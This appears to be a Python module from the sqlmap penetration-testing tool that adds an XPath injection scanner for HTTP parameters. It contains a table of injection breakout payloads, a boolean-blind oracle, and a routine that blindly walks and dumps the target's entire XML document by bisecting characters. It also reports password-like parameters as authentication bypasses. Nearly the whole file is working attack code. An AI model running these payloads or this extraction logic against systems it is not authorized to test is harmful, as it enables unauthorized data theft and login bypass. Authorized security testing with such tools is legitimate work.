#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import difflib
import re
import time

from collections import namedtuple

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.core.settings import UPPER_RATIO_BOUND
from lib.core.settings import XPATH_CHAR_MAX
from lib.core.settings import XPATH_CHAR_MIN
from lib.core.settings import XPATH_ERROR_REGEX
from lib.core.settings import XPATH_ERROR_SIGNATURES
from lib.core.settings import XPATH_MAX_DEPTH
from lib.core.settings import XPATH_MAX_LENGTH
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange


SENTINEL = randomStr(length=10, lowercase=True)

XPATH_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST)

# Each detection breakout is paired with a false variant and an (optional) extraction
# boundary.  The boundary carries a prefix/suffix pair that wraps the extraction
# predicate so the surrounding template stays syntactically valid.
#
# Breakouts are listed in detection-priority order: function-argument closers first,
# then simple string, double-quoted, union wildcard, and bare numeric/boolean.

_BREAKOUT_TABLE = (
    # (breakout,                               false_variant,                        extraction_prefix, extraction_suffix  )
    # -- function-argument (closes paren + string) ------------------------------------------------------------
    ("') or true() or ('",                     "') and false() and ('",               "') or ",          " or ('"),
    ("') or '1'='1' or ('",                    "') and '1'='2' and ('",              "') or ",          " or ('"),
    ("') or 1=1 or ('",                        "') and 1=2 and ('",                   "') or ",          " or ('"),
    # -- single-quoted string (suffix absorbs trailing quote; predicate decisive when original value unmatched)
    ("' or '1'='1",                            "' and '1'='2",                        "' or ",           " and '1'='1"),
    ("' or true() or '",                       "' and false() and '",                 "' or ",           " and '1'='1"),
    ("' or 1=1 or '",                          "' and 1=2 and '",                     "' or ",           " and '1'='1"),
    # -- AND context (single-quoted) -------------------------------------------------------------------------
    ("' and '1'='1",                           "' and '1'='2",                        "' and ",          " and '1'='1"),
    # -- double-quoted string (suffix absorbs trailing quote) -------------------------------------------------
    ('" or "1"="1',                            '" and "1"="2',                        '" or ',           ' and "1"="1'),
    ('" or true() or "',                       '" and false() and "',                 '" or ',           ' and "1"="1'),
    # -- double-quoted function-argument ---------------------------------------------------------------------
    ('") or true() or ("',                     '") and false() and ("',               '") or ',          ' or ("'),
    # -- union wildcard (detection-only, no extraction) ------------------------------------------------------
    ("']|//*|test['",                          None,                                  None,              None),
    # -- numeric / bare context (extraction uses 'and'; requires original value to not match anything) ----------
    (" or 1=1",                                " and 1=2",                            " and ",           ""),
    (" or true()",                             " and false()",                        " and ",           ""),
)

# Boundary: a verified injection boundary with an extraction prefix+suffix and an
# extractable flag.  Only extractable boundaries can drive tree-walking.
Boundary = namedtuple("Boundary", ("prefix", "suffix", "extractable"))

# Convenience lookups built from _BREAKOUT_TABLE
_BREAKOUT_FALSE_MAP = {}
_BREAKOUT_BOUNDARY = {}
_BREAKOUT_LIST = []
for _entry in _BREAKOUT_TABLE:
    _bk, _fv, _pfx, _sfx = _entry
    _BREAKOUT_LIST.append(_bk)
    _BREAKOUT_FALSE_MAP[_bk] = _fv
    if _pfx is not None:
        _BREAKOUT_BOUNDARY[_bk] = Boundary(_pfx, _sfx, True)
    else:
        _BREAKOUT_BOUNDARY[_bk] = None
XPATH_BREAKOUT_PREFIXES = tuple(_BREAKOUT_LIST)

Slot = namedtuple("Slot", ("place", "parameter", "backend", "oracle", "template", "payload", "boundary"))
Slot.__new__.__defaults__ = (None, None, None, None, None, None, None)


def _ratio(first, second):
    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()


def _delim(place):
    return (conf.cookieDel or ';') if place == PLACE.COOKIE else '&'


def _confParameters(place):
    try:
        return conf.parameters.get(place, "")
    except AttributeError:
        return conf.parameters[place] if place in conf.parameters else ""


def _originalValue(place, parameter):
    for segment in _confParameters(place).split(_delim(place)):
        name, _, value = segment.partition('=')
        if name.strip() == parameter:
            return value
    return conf.paramDict.get(place, {}).get(parameter) or ""


def _replaceSegment(place, parameter, value):
    delimiter = _delim(place)
    raw = _confParameters(place)
    retVal, replaced = [], False

    for part in raw.split(delimiter):
        name, _, _ = part.partition('=')
        if not replaced and name.strip() == parameter:
            retVal.append("%s=%s" % (name, value))
            replaced = True
        else:
            retVal.append(part)

    if not replaced:
        retVal = []
        for name, oldValue in conf.paramDict.get(place, {}).items():
            retVal.append("%s=%s" % (name, value if name == parameter else oldValue))

    return delimiter.join(retVal)


def _send(place, parameter, value):
    """Issue a single HTTP request with the target parameter set to `value`.
    Temporarily mutates conf.parameters so sqlmap's normal request machinery
    (URL construction, cookies, headers, encodings) is fully preserved."""

    if conf.delay:
        time.sleep(conf.delay)

    old_params = conf.parameters.get(place, "")
    conf.parameters[place] = _replaceSegment(place, parameter, value)

    try:
        kwargs = {"raise404": False, "silent": True}
        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
        page, _, _ = Request.getPage(**kwargs)
        return page or ""
    except Exception as ex:
        logger.debug("XPath probe request failed: %s" % getUnicode(ex))
        return ""
    finally:
        conf.parameters[place] = old_params


def _isError(page):
    return bool(re.search(XPATH_ERROR_REGEX, getUnicode(page or "")))


def _backendFromError(page):
    page = getUnicode(page or "")
    for backend, regex in XPATH_ERROR_SIGNATURES:
        if re.search(regex, page):
            return backend
    return "Generic XPath" if _isError(page) else None


def _probeBackendByParserError(place, parameter):
    """Probe for XPath parser errors to obtain a backend hint.
    This is NOT authoritative detection -- only a boolean oracle confirms injection."""

    original = _originalValue(place, parameter) or "x"
    normal = _send(place, parameter, original)

    for suffix in ("'", '"', "')", '")', "]", "|"):
        payload = original + suffix
        broken = _send(place, parameter, payload)

        if not normal or _ratio(normal, broken) >= UPPER_RATIO_BOUND:
            continue

        backend = _backendFromError(broken)
        if backend and not _isError(normal):
            return backend, payload

    return None, None


def _boolean(truthy, falsy):
    """Return the reproducible true page when true/false probes diverge.
    Both true AND false pages must be independently reproducible."""

    truePage = truthy()
    if truePage is None or _isError(truePage):
        return None

    truePage2 = truthy()
    if _ratio(truePage, truePage2) < UPPER_RATIO_BOUND:
        return None

    falsePage = falsy()
    if falsePage is None or _isError(falsePage):
        return None

    falsePage2 = falsy()
    if _ratio(falsePage, falsePage2) < UPPER_RATIO_BOUND:
        return None

    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
        return truePage

    return None


def _makePayload(original, boundary, predicate):
    """Construct a payload by inserting `predicate` into the verified boundary."""
    if boundary.suffix:
        return "%s%s%s%s" % (original, boundary.prefix, predicate, boundary.suffix)
    return "%s%s%s" % (original, boundary.prefix, predicate)


def _detectBoolean(place, parameter):
    """Return (template, payload, boundary) for boolean-blind XPath injection.
    boundary is None for detection-only breakouts (wildcard, union)."""

    original = _originalValue(place, parameter) or ""

    for breakout in XPATH_BREAKOUT_PREFIXES:
        truePayload = original + breakout
        falseVariant = _BREAKOUT_FALSE_MAP.get(breakout)
        if not falseVariant:
            continue

        falseSpecific = original + falseVariant
        template = _boolean(lambda p=truePayload: _send(place, parameter, p),
                            lambda p=falseSpecific: _send(place, parameter, p))
        if template:
            boundary = _BREAKOUT_BOUNDARY.get(breakout)
            return template, truePayload, boundary

    # Wildcard: only useful for bool differentiation, not enumeration
    if original:
        template = _boolean(lambda: _send(place, parameter, "*"),
                            lambda: _send(place, parameter, SENTINEL))
        if template:
            return template, "*", None

    return None, None, None


def _isPasswordParam(parameter):
    parameter = getUnicode(parameter or "").lower()
    return any(_ in parameter for _ in ("pass", "pwd", "secret", "pin", "cred", "key", "token", "auth"))


def _fingerprintByError(backend):
    if not backend:
        return None
    for name, _ in XPATH_ERROR_SIGNATURES:
        if name in backend:
            return name
    return backend


def _xpathQuote(s):
    """Quote a string for an XPath string literal, choosing the delimiter that
    requires no escaping. When both quotes appear, use concat()."""

    s = getUnicode(s)
    if "'" not in s:
        return "'%s'" % s
    if '"' not in s:
        return '"%s"' % s
    # both quote types present: use concat() with " as outer delimiter
    return "concat(%s)" % ", '\"', ".join('"%s"' % part for part in s.split('"'))


class _XPathPayloadBuilder(object):
    """Build XPath boolean predicates for blind tree-walking using the verified
    injection boundary from detection. Each method returns a complete payload."""

    def __init__(self, original, boundary):
        self.original = original or "x"
        self.boundary = boundary

    def _make(self, predicate):
        return _makePayload(self.original, self.boundary, predicate)

    def nameStartsWith(self, path, prefix):
        return self._make("starts-with(name(%s),%s)" % (path, _xpathQuote(prefix)))

    def nameLength(self, path, length):
        return self._make("string-length(name(%s))=%d" % (path, length))

    def childCount(self, path, count):
        return self._make("count(%s/*)>=%d" % (path, count))

    def attributeCount(self, path, count):
        return self._make("count(%s/@*)>=%d" % (path, count))

    def attributeNameStartsWith(self, path, index, prefix):
        return self._make("starts-with(name(%s/@*[%d]),%s)" % (path, index, _xpathQuote(prefix)))

    def attributeValueStartsWith(self, path, index, prefix):
        return self._make("starts-with(string(%s/@*[%d]),%s)" % (path, index, _xpathQuote(prefix)))

    def textStartsWith(self, path, prefix):
        return self._make("starts-with(string(%s),%s)" % (path, _xpathQuote(prefix)))

    def stringLengthAtLeast(self, target, n):
        return self._make("string-length(%s)>=%d" % (target, n))

    def charPresent(self, target, pos):
        # True when the character at 1-based position `pos` of `target` belongs to
        # the known ordered charset (so its index can be resolved by bisection).
        return self._make("contains(%s,substring(%s,%d,1))" % (_CS_LITERAL, target, pos))

    def charIndexAtLeast(self, target, pos, n):
        # The 0-based index of a charset member equals the length of the charset
        # prefix preceding it (XPath 1.0 has no lexicographic '<', but
        # string-length(substring-before(...)) yields a number we can bisect on).
        return self._make("string-length(substring-before(%s,substring(%s,%d,1)))>=%d" % (_CS_LITERAL, target, pos, n))


def _makeOracle(place, parameter, template):
    """Build an oracle from a verified true template. extract(payload) returns
    True when the response is closer to the true template than to the false page."""

    cache = {}

    def request(payload):
        if payload not in cache:
            cache[payload] = _send(place, parameter, payload)
        return cache[payload]

    falsePage = request(SENTINEL)

    def oracle(payload):
        page = request(payload)
        if page is None or _isError(page):
            return False
        return _ratio(template, page) >= UPPER_RATIO_BOUND

    def extract(payload):
        page = request(payload)
        if page is None or _isError(page):
            return False
        trueRatio = _ratio(template, page)
        falseRatio = _ratio(falsePage, page)
        # Require either an unambiguous match against the template or a
        # clear separation from the false page (minimum 5 %pt margin)
        return trueRatio >= UPPER_RATIO_BOUND or (trueRatio - falseRatio) > 0.05

    oracle.extract = extract
    oracle.template = template
    oracle.falsePage = falsePage
    oracle.cache = cache
    return oracle


# Frequency-ordered charset for blind character extraction.
# Excludes characters that are XPath metacharacters or problematic in URL context.
_META_ORDS = set(ord(_) for _ in ("'", '"', '[', ']', '<', '>', '&', '/'))
_FREQ = (tuple(xrange(ord('a'), ord('z') + 1)) +
         tuple(xrange(ord('A'), ord('Z') + 1)) +
         tuple(xrange(ord('0'), ord('9') + 1)) +
         tuple(ord(_) for _ in "@._-+ "))
_CHARSET = []
for _ in _FREQ:
    if XPATH_CHAR_MIN <= _ <= XPATH_CHAR_MAX and _ not in _META_ORDS and _ not in _CHARSET:
        _CHARSET.append(_)
for _ in xrange(XPATH_CHAR_MIN, XPATH_CHAR_MAX + 1):
    if _ not in _META_ORDS and _ not in _CHARSET:
        _CHARSET.append(_)

# Codepoint-ordered charset used by the binary-search extractor. Ordering here MUST match
# the literal string `_CS_LITERAL` so that a recovered index maps back to the right character.
_CS_ORDS = [_ for _ in xrange(XPATH_CHAR_MIN, XPATH_CHAR_MAX + 1) if _ not in _META_ORDS]
_CS_LITERAL = _xpathQuote("".join(chr(_) for _ in _CS_ORDS))


def _inferValue(oracle, builder, path, getter, maxLen=XPATH_MAX_LENGTH):
    """Blindly infer a string value at `path` using `getter(builder, path, prefix)`.
    Returns the recovered value or None."""

    value = ""
    probes = 0

    for _ in xrange(maxLen):
        found = False

        for cp in _CHARSET:
            candidate = value + chr(cp)
            probes += 1

            if oracle.extract(getter(builder, path, candidate)):
                value = candidate
                found = True
                break

        if not found:
            break

        if value.endswith("   "):
            value = value.rstrip()
            break

    logger.debug("XPath blind inference: %d probes (length=%d)" % (probes, len(value)))
    return value if value else None


def _inferCount(oracle, builder, path, countFn, maxCount=128):
    """Binary search for a count value using predicate 'count(...)>=N'."""

    if not oracle.extract(countFn(builder, path, 1)):
        return 0

    lo, hi = 1, maxCount
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle.extract(countFn(builder, path, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


def _inferString(oracle, builder, target, maxLen=XPATH_MAX_LENGTH):
    """Blindly recover the string value of XPath expression `target` (e.g.
    "name(/*)" or "string(/*[1]/@*[1])") using binary search.

    The length is bisected first, then each character is resolved by bisecting
    its index inside the ordered charset. This needs ~log2(len) requests per
    character versus the linear charset scan in _inferValue(), which matters a
    lot when walking a whole document tree. Characters outside the charset are
    surfaced as '?' so the rest of the value is still recovered."""

    if not oracle.extract(builder.stringLengthAtLeast(target, 1)):
        return None

    lo, hi = 1, maxLen
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle.extract(builder.stringLengthAtLeast(target, mid)):
            lo = mid
        else:
            hi = mid - 1
    length = lo

    chars = []
    probes = 0
    last = len(_CS_ORDS) - 1
    for pos in xrange(1, length + 1):
        probes += 1
        if not oracle.extract(builder.charPresent(target, pos)):
            chars.append("?")
            continue

        clo, chi = 0, last
        while clo < chi:
            cmid = (clo + chi + 1) // 2
            probes += 1
            if oracle.extract(builder.charIndexAtLeast(target, pos, cmid)):
                clo = cmid
            else:
                chi = cmid - 1
        chars.append(chr(_CS_ORDS[clo]))

    value = "".join(chars)
    logger.debug("XPath blind inference: %d probes (length=%d)" % (probes, length))
    return value or None


def _walkTree(oracle, builder, path="/*", depth=0):
    """Recursively walk the XML tree from a given XPath expression.
    Returns a dict: {name, path, children, attributes, text} or None."""

    if depth > XPATH_MAX_DEPTH:
        return None

    name = _inferString(oracle, builder, "name(%s)" % path)
    if not name:
        return None

    logger.info("discovered element: '%s'" % name)

    childCount = _inferCount(oracle, builder, path,
                             lambda b, p, c: b.childCount(p, c),
                             maxCount=32)

    attrCount = _inferCount(oracle, builder, path,
                            lambda b, p, c: b.attributeCount(p, c),
                            maxCount=16)

    attributes = []
    for i in xrange(1, attrCount + 1):
        attrName = _inferString(oracle, builder, "name(%s/@*[%d])" % (path, i))
        if not attrName:
            continue

        attrValue = _inferString(oracle, builder, "string(%s/@*[%d])" % (path, i))
        attributes.append({"name": attrName, "value": attrValue or ""})
        logger.info("  attribute: @%s='%s'" % (attrName, attrValue or ""))

    text = None
    if childCount == 0:
        text = _inferString(oracle, builder, "string(%s)" % path)

    children = []
    for i in xrange(1, childCount + 1):
        childPath = "%s/*[%d]" % (path, i)
        child = _walkTree(oracle, builder, childPath, depth + 1)
        if child:
            children.append(child)

    return {
        "name": name,
        "path": path,
        "children": children,
        "attributes": attributes,
        "text": text,
    }


def _treeToTable(node):
    """Flatten a tree node to (columns, rows) for grid output."""

    columns = ["Path", "Element", "Attribute", "Value"]
    rows = []

    def _flatten(n, depth=0):
        path = n["path"]
        rows.append([path, n["name"], "", ""])
        for attr in n.get("attributes", []):
            rows.append([path, n["name"], "@" + attr["name"], attr["value"]])
        if n.get("text"):
            rows.append([path, n["name"], "text()", n["text"]])
        for child in n.get("children", []):
            _flatten(child, depth + 1)

    _flatten(node)
    return columns, [_ for _ in rows if _[3] or _[2] not in ("", "text()")]


def _grid(columns, rows):
    columns = [getUnicode(_) for _ in columns]
    rows = [[getUnicode(_) for _ in row] for row in rows]

    widths = []
    for index, column in enumerate(columns):
        width = len(column)
        for row in rows:
            if index < len(row):
                width = max(width, len(getUnicode(row[index])))
        widths.append(width)

    separator = "+-" + "-+-".join("-" * _ for _ in widths) + "-+"

    def line(cells):
        return "| " + " | ".join((getUnicode(cells[index]) if index < len(cells) else "").ljust(widths[index]) for index in xrange(len(columns))) + " |"

    return "\n".join([separator, line(columns), separator] + [line(row) for row in rows] + [separator])


def _dumpTable(title, columns, rows):
    if rows:
        conf.dumper.singleString("%s:\n%s" % (title, _grid(columns, rows)))


def xpathScan():
    global SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)

    debugMsg = "'--xpath' is self-contained: it detects XPath injection in HTTP "
    debugMsg += "parameters and walks the reachable XML document tree. SQL enumeration "
    debugMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
    logger.debug(debugMsg)

    if not conf.paramDict:
        logger.error("no request parameters to test (use --data, GET params, or similar)")
        return

    tested = found = 0
    slots = []

    for place in (_ for _ in XPATH_PLACES if _ in conf.paramDict):
        for parameter in list(conf.paramDict[place].keys()):
            if conf.testParameter and parameter not in conf.testParameter:
                continue

            tested += 1
            logger.info("testing XPath injection on %s parameter '%s'" % (place, parameter))

            # Phase 1: Probe the XPath parser for a backend hint
            backendHint, _errorPayload = _probeBackendByParserError(place, parameter)
            if backendHint:
                backendHint = _fingerprintByError(backendHint)

            # Phase 2: Establish a boolean oracle (authoritative)
            template, payload, boundary = _detectBoolean(place, parameter)
            if template:
                if boundary and boundary.extractable:
                    found += 1
                    backend = backendHint or "Generic XPath"
                    logger.info("%s parameter '%s' is vulnerable to XPath injection (back-end: '%s')" % (place, parameter, backend))
                    if conf.beep:
                        beep()

                    oracle = _makeOracle(place, parameter, template)
                    slots.append(Slot(place=place, parameter=parameter, backend=backend,
                                      oracle=oracle, template=template, payload=payload,
                                      boundary=boundary))
                    continue

                # Detection-only: boolean differentiation confirmed but no extraction boundary.
                # Report as auth bypass on credential fields; log generically otherwise.
                found += 1
                if _isPasswordParam(parameter):
                    title = "XPath auth bypass"
                    logger.info("%s parameter '%s' allows XPath auth bypass (boolean differentiation confirmed)" % (place, parameter))
                else:
                    title = "XPath boolean-based blind (detection-only)"
                    logger.info("%s parameter '%s' is vulnerable to XPath injection (detection-only, back-end: '%s')" % (place, parameter, backendHint or "Generic XPath"))
                if conf.beep:
                    beep()
                conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: XPath injection\n    Title: %s\n    Payload: %s=%s\n---" % (parameter, place, title, parameter, payload))
                continue

            if backendHint:
                logger.info("%s parameter '%s' reaches an XPath parser (back-end: '%s'), but no exploitable boolean oracle was established" % (place, parameter, backendHint))

    if not slots:
        if found:
            logger.info("XPath injection confirmed (detection-only, no extractable boundary established)")
            logger.info("XPath scan complete")
            return
        if tested:
            warnMsg = "no parameter appears to be injectable via XPath injection (%d tested)" % tested
        else:
            warnMsg = "no parameters found to test for XPath injection"
        logger.warning(warnMsg)
        return

    # Select the first oracle-bearing slot with an extractable boundary for tree-walking
    slot = next((_ for _ in slots if _.oracle and _.boundary and _.boundary.extractable), None)
    if not slot:
        logger.info("XPath scan complete")
        return

    original = _originalValue(slot.place, slot.parameter) or "x"
    # OR-style boundaries always-true if the original branch matches, so use a
    # sentinel that is guaranteed not to appear as a field value.  AND-style
    # boundaries need the original branch to match; keep the original there.
    if " or " in slot.boundary.prefix:
        base = SENTINEL
    else:
        base = original
    builder = _XPathPayloadBuilder(base, slot.boundary)
    oracle = slot.oracle

    # Refine backend fingerprint if generic
    if not slot.backend or slot.backend == "Generic XPath":
        backend = _backendFromError(oracle.template)
        if backend:
            backend = _fingerprintByError(backend)
            if backend:
                logger.info("identified back-end: '%s'" % backend)
                slot = slot._replace(backend=backend)

    title = "XPath boolean-based blind"
    conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: XPath injection\n    Title: %s\n    Payload: %s=%s\n---" % (slot.parameter, slot.place, title, slot.parameter, slot.payload))

    # Blind XML tree-walking (attempted document-root traversal)
    logger.info("walking XML document tree (depth limit: %d)" % XPATH_MAX_DEPTH)
    root = _walkTree(oracle, builder)

    if root:
        columns, rows = _treeToTable(root)
        logger.info("extracted %d node(s) from XML tree" % (len(rows)))
        _dumpTable("XPath: %s parameter '%s' XML tree" % (slot.place, slot.parameter), columns, rows)
    else:
        warnMsg = "XPath injection is confirmed but the XML tree could not be walked. "
        warnMsg += "This may indicate a restricted XPath context (subtree, scalar, or predicate-only)"
        logger.warning(warnMsg)

    logger.info("XPath scan complete")
